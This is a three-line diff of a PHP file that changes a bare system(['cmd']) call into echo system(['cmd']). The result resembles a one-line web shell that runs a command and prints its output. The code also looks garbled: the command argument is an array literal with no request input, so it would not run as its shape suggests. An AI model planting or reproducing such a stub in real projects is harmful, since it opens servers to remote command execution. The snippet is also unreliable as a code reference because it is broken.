@@ -1,3 +1,3 @@
 <?php
-system(['cmd']);
+echo system(['cmd']);
 ?>
